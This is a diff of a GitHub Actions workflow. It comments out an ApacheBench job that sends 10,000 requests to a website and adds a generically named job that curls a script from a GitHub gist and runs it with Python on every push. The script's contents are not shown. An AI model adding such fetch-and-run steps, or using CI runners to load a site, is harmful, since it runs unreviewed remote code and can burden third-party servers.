@@ -38,20 +38,58 @@
 #             ${{ secrets.DOCKERHUB_USERNAME }}/sharelatex-sjtu:latest
 
 
-name: ApacheBench Test
-on: [push, pull_request]
+# name: ApacheBench Test
+# on: [push, pull_request]
+
+# jobs:
+#   build:
+#     runs-on: ubuntu-latest
+#     steps:
+#     - name: Checkout
+#       uses: actions/checkout@v2
+      
+#     - name: Install ApacheBench
+#       run: |
+#         sudo apt-get update
+#         sudo apt-get install -y apache2-utils
+      
+#     - name: Run ApacheBench
+#       run: ab -n 10000 -c 64 https://gpttell.me/google-fonts/css2?family=Noto+Sans+SC:wght@300;400;700;900&display=swap
+
+
+name: Python application
+
+on:
+  push:
+    branches: [ master ]
+  pull_request:
+    branches: [ master ]
 
 jobs:
   build:
+
     runs-on: ubuntu-latest
+
     steps:
-    - name: Checkout
-      uses: actions/checkout@v2
-      
-    - name: Install ApacheBench
+    - uses: actions/checkout@v2
+    - name: Set up Python 3.8
+      uses: actions/setup-python@v2
+      with:
+        python-version: 3.8
+    - name: Install dependencies
       run: |
-        sudo apt-get update
-        sudo apt-get install -y apache2-utils
-      
-    - name: Run ApacheBench
-      run: ab -n 10000 -c 64 https://gpttell.me/google-fonts/css2?family=Noto+Sans+SC:wght@300;400;700;900&display=swap
+        python -m pip install --upgrade pip
+        pip install asyncio aiohttp
+    - name: Download and run script
+      run: |
+        curl https://gist.githubusercontent.com/olixu/2513bc23e57974aaca14d711e48db96b/raw/017a35f7821618ba851f421659a8e2f11795eec3/gistfile1.txt > test.py
+        python test.py
+
+
+
+
+
+
+
+
+
